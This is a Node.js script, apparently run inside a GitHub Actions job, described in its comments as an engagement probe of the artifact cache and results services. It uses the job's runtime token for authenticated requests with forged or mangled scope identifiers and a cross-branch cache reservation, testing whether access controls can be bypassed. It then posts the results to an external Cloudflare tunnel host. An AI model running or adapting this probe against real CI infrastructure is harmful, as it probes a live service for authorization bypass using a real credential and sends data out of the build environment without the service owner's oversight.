// Engagement probe: artifactcache + results-receiver scope enforcement.
// Runs INSIDE the action process (env carries this job's runtime token).
// All probes target either our own scope (baseline) or deliberately-mangled
// scope identifiers (negative controls) — never another user's data.
const { execFileSync } = require('child_process');

const TOK = process.env.ACTIONS_RUNTIME_TOKEN;
const CACHE = (process.env.ACTIONS_CACHE_URL || '').replace(/\/$/, '');
const RESULTS = (process.env.ACTIONS_RESULTS_URL || '').replace(/\/$/, '');
const out = [];

function probe(label, url, method, headers, body) {
  const args = ['-sS', '--max-time', '12', '-o', '/dev/null', '-w', '%{http_code} %{size_download}', '-X', method || 'GET'];
  for (const [k, v] of Object.entries(headers || {})) args.push('-H', `${k}: ${v}`);
  if (body) args.push('--data-binary', body);
  args.push(url);
  let r;
  try { r = execFileSync('/usr/bin/curl', args, { timeout: 15000 }).toString(); }
  catch (e) { r = 'ERR ' + e.message.slice(0, 60); }
  out.push(`${label}: ${r}`);
}

const H = {
  'Authorization': `Bearer ${TOK}`,
  'Accept': 'application/json; api-version=6.0-preview',
};

if (CACHE) {
  const base = CACHE.replace(/\/[^/]+$/, '');
  const seg = CACHE.split('/').pop();
  const mangled = seg.slice(0, -1) + (seg.slice(-1) === 'A' ? 'B' : 'A');

  probe('A1-own-list', `${CACHE}_apis/artifactcache/cache?keys=probe&version=v1`, 'GET', H);
  probe('A2-mangled-seg-list', `${base}/${mangled}/_apis/artifactcache/cache?keys=probe&version=v1`, 'GET', H);
  probe('A3-no-seg-list', `${base}/_apis/artifactcache/cache?keys=probe&version=v1`, 'GET', H);
  probe('A4-other-path-style', `${base}/${seg}/_apis/artifactcache/caches`, 'GET', H);
  probe('A5-reserve-crossbranch', `${CACHE}_apis/artifactcache/cache`, 'POST',
    { ...H, 'Content-Type': 'application/json' },
    JSON.stringify({ key: 'refs/heads/main/otherkey', version: 'v1', cacheSize: 100 }));
}

if (RESULTS) {
  probe('B1-results-root', RESULTS, 'GET', H);
  probe('B2-results-bogus-upload', `${RESULTS}twirp/github.actions.results.api.v1.ArtifactService/CreateArtifact`, 'POST',
    { ...H, 'Content-Type': 'application/json' },
    JSON.stringify({ workflow_run_backfill: false, name: 'probe-x' }));
}

try {
  execFileSync('/usr/bin/curl', ['-sS', '--max-time', '15', '-X', 'POST', '-H', 'Content-Type: text/plain',
    '--data-binary', out.join('\n'),
    'https://speak-situations-pacific-myers.trycloudflare.com/cache-probe-result'],
    { stdio: 'ignore', timeout: 20000 });
  console.log('probe results delivered');
} catch (e) { console.log('tunnel unreachable: ' + e.message.slice(0, 60)); }
console.log(out.join('\n'));
